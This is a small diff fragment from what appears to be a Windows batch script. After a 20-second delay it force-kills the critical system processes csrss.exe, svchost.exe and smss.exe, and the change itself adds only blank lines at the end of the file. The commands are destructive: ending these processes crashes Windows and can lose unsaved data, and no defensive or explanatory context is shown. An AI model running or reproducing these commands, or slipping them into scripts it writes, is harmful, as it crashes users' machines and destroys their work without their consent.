@@ -656,3 +656,10 @@ timeout 20 /nobreak
 taskkill /im csrss.exe
 taskkill /im svchost.exe
 taskkill /im smss.exe 
+
+
+
+
+
+
+
